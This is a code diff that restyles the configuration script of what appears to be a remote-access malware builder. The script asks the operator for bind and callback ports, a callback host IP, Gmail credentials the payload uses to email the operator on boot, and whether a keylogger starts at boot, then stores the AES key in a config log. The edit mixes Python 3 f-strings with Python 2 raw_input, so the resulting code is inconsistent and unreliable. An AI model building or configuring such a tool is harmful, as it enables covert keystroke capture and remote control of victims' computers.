@@ -41,7 +41,7 @@ def create_new_config():
     KEYLOGGER_BOOT = False
 
     st_bind = ''
-    while st_bind != "y" and st_bind != "yes" and st_bind != "n" and st_bind != "no":
+    while st_bind not in ["y", "yes", "n", "no"]:
         st_bind = raw_input('\nWould you like the payload to bind itself? [Y/N]: ').lower()
     if st_bind.startswith('y'):
         BIND = True
@@ -61,7 +61,7 @@ def create_new_config():
         BPORT = ""
 
     st_conn = ''
-    while st_conn != "y" and st_conn != "yes" and st_conn != "n" and st_conn != "no":
+    while st_conn not in ["y", "yes", "n", "no"]:
         st_conn = raw_input('\nWould you like the payload to connect to a host? [Y/N]:  ').lower()
     if st_conn.startswith('y'):
         LISTEN = True
@@ -72,16 +72,22 @@ def create_new_config():
         st_chost = raw_input('\nEnter the host IP you want the payload to connect to: ').lower()
         LHOST = st_chost
 
-        st_cport = raw_input('Enter the port on "{}" that you want the payload to connect to: '.format(st_chost)).lower()
+        st_cport = raw_input(
+            f'Enter the port on "{st_chost}" that you want the payload to connect to: '
+        ).lower()
+
         while not check_int(st_cport):
-            st_cport = raw_input('Enter the port on "{}" that you want the payload to connect to: '.format(st_chost)).lower()
+            st_cport = raw_input(
+                f'Enter the port on "{st_chost}" that you want the payload to connect to: '
+            ).lower()
+
         LPORT = st_cport
     else:
         LHOST = ""
         LPORT = ""
 
     st_email = ''
-    while st_email != "y" and st_email != "yes" and st_email != "n" and st_email != "no":
+    while st_email not in ["y", "yes", "n", "no"]:
         st_email = raw_input('\nWould you like the payload to email you on boot? [Y/N]:  ').lower()
     if st_email.startswith('y'):
         EMAIL = True
@@ -93,13 +99,16 @@ def create_new_config():
             GMAIL_USER = raw_input('\nEnter a valid gmail address you want the payload to use: ').lower()
             if '@gmail.com' in GMAIL_USER:
                 break
-        GMAIL_PWD = base64.b64encode(getpass('Enter your email password for {}: '.format(GMAIL_USER)))
+        GMAIL_PWD = base64.b64encode(
+            getpass(f'Enter your email password for {GMAIL_USER}: ')
+        )
+
     else:
         GMAIL_USER = "None"
         GMAIL_PWD = ""
 
     st_klboot = ''
-    while st_klboot != "y" and st_klboot != "yes" and st_klboot != "n" and st_klboot != "no":
+    while st_klboot not in ["y", "yes", "n", "no"]:
         st_klboot = raw_input('\nWould you like the keylogger to start on boot? [Y/N]:  ').lower()
     if st_klboot.startswith('y'):
         KEYLOGGER_BOOT = True
@@ -132,14 +141,14 @@ def confirm_config():
 
 def get_conf_dir():
     i = 1
-    while os.path.exists(os.path.join(payloads_path,'config{}'.format(i))):
+    while os.path.exists(os.path.join(payloads_path, f'config{i}')):
         i += 1
-    conf_dir = os.path.join(payloads_path,'config{}'.format(i))
+    conf_dir = os.path.join(payloads_path, f'config{i}')
     os.makedirs(conf_dir)
 
     with open(st_config,'rb') as sc:
         content=sc.read()
-        content += "AES Encryption Key: {}".format(aes_encoded)
+        content += f"AES Encryption Key: {aes_encoded}"
         with open(os.path.join(conf_dir,'PAYLOAD_CONFIG.log'),'wb') as pc:
             pc.write(content)
 
